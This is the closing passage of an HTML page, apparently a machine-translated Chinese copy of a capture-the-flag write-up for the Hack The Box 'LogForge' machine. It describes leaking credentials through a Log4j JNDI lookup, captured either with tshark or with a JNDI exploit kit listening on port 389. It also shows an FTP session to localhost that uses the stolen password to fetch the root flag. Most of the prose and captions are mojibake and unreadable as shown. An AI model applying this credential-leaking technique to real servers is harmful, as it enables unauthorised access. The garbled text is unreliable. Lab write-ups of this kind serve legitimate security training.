translated">tsharkæ•è·ç¯å¢ƒå˜é‡çš„å†…å®¹ä»¥æ­ç¤ºå‡­è¯</figcaption></figure><p id="e637" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">é€šè¿‡å°†PENCERæ”¾å…¥å­—ç¬¦ä¸²ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°åœ¨è¾“å‡ºä¸­çœ‹åˆ°å®ƒã€‚æˆ‘ä»¬è¿˜å¯ä»¥grepæ¥æ˜¾ç¤ºæˆ‘ä»¬æ„Ÿå…´è¶£çš„è¡Œ:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi oa"><img src="../Images/835943e43f412d007c31d338fa81d6f8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vOASdQ9_CL9cq4VkOcIipw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">tsharkçš„Greppedè¾“å‡ºä¾¿äºæŸ¥çœ‹</figcaption></figure><p id="ad86" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†ç”¨æˆ·åå’Œå¯†ç ã€‚æˆ‘ä»¬ç°åœ¨å¯ä»¥åˆ‡æ¢å›æœºå™¨ï¼Œæ­£ç¡®ç™»å½•å¹¶å†æ¬¡è·å¾—æ ¹æ ‡å¿—:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="78f3" class="nj km iq nf b gy nk nl l nm nn">tomcat@LogForge:/tmp$ ftp localhost<br/>Connected to localhost.<br/>220 Welcome to the FTP-Server<br/>Name (localhost:tomcat): ippsec<br/>331 User name okay, need password<br/>Password:<br/>230-Welcome to HKUST<br/>230 User logged in successfully<br/>Remote system type is FTP.<br/>ftp&gt; get root.txt<br/>local: root.txt remote: root.txt<br/>200 Command OK<br/>150 Opening ASCII mode data connection for requested file root.txt<br/>WARNING! 1 bare linefeeds received in ASCII mode<br/>File may not have transferred correctly.<br/>226 File transfer successful. Closing data connection.<br/>33 bytes received in 0.00 secs (49.5032 kB/s)<br/>ftp&gt; exit<br/>221 Closing connection<br/>tomcat@LogForge:/tmp$ cat root.txt <br/>&lt;HIDDEN&gt;</span></pre><h1 id="2914" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">FTP JNDIæ¼æ´2</h1><p id="66f6" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">æˆ‘ä»¬è¿˜å¯ä»¥åšå¦å¤–ä¸€ä»¶äº‹ï¼Œè€Œä¸æ˜¯ä½¿ç”¨tsharkæ¥æ•è·æµæ°“LDAPæœåŠ¡å™¨ä½œä¸ºæœ‰æ•ˆè´Ÿè½½å‘é€çš„æµé‡ã€‚è¿™å®é™…ä¸Šè¦å®¹æ˜“å¾—å¤šï¼Œæˆ‘ä»¬åªéœ€åœ¨389ç«¯å£ç›‘å¬JNDIæ¼æ´åˆ©ç”¨å·¥å…·åŒ…ï¼Œä½†æ²¡æœ‰æœ‰æ•ˆè½½è·ã€‚ä½¿ç”¨ä¸ä¹‹å‰ç›¸åŒçš„JNDIæŸ¥è¯¢ä½œä¸ºFTPç”¨æˆ·åï¼Œå½“æ‚¨åˆ‡æ¢å›Kaliæ—¶ï¼Œæ‚¨ä¼šçœ‹åˆ°æˆ‘ä»¬æœ‰æˆ‘ä»¬æƒ³è¦çš„:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi ob"><img src="../Images/14ff8931d0cff7a32036f794d48ac77f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zZrH_JS9eojpqOf8vrncxA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">JNDIæ¼æ´å·¥å…·åŒ…æš´éœ²å‡­æ®</figcaption></figure><p id="5a94" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œå½“å®ƒä»ç›’å­é‡Œæ”¶åˆ°JNDIå­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¸çŸ¥é“å¦‚ä½•å¤„ç†å®ƒï¼Œå› ä¸ºæ²¡æœ‰è®¾ç½®æœ‰æ•ˆè½½è·æ¥å“åº”ã€‚æœ‰ç›Šçš„æ˜¯ï¼Œå®ƒå‘æˆ‘ä»¬æ˜¾ç¤ºäº†æ”¶åˆ°çš„å†…å®¹ï¼ŒåŒ…æ‹¬é‚£äº›æ‰©å±•çš„å˜é‡ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°å®ƒä»¬çš„å†…å®¹ã€‚</p><p id="c4ac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™æ˜¯åœ¨è¿™ä¸ªç›’å­ä¸Šè·å¾—æ ¹æ ‡å¿—çš„ä¸‰ç§æ–¹æ³•ã€‚å¸Œæœ›ä½ å–œæ¬¢ï¼Œä¸‹æ¬¡è§ã€‚</p></div><div class="ab cl oc od hu oe" role="separator"><span class="of bw bk og oh oi"/><span class="of bw bk og oh oi"/><span class="of bw bk og oh"/></div><div class="ij ik il im in"><p id="14ed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦‚æœä½ å–œæ¬¢è¿™ç¯‡æ–‡ç« ï¼Œè¯·ç»™æˆ‘ä¸€ä¸¤ä¸ªæŒå£°(è¿™æ˜¯å…è´¹çš„ï¼)</p><p id="8822" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ¨ç‰¹â€”<a class="ae lv" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>ç½‘ç«™â€” <a class="ae lv" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="bb99" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="oj">åŸè½½äº2022å¹´1æœˆ2æ—¥</em><a class="ae lv" href="https://pencer.io/ctf/ctf-htb-logforge/" rel="noopener ugc nofollow" target="_blank"><em class="oj">https://pencer . io</em></a><em class="oj">ã€‚</em></p></div></div>    
</body>
</html>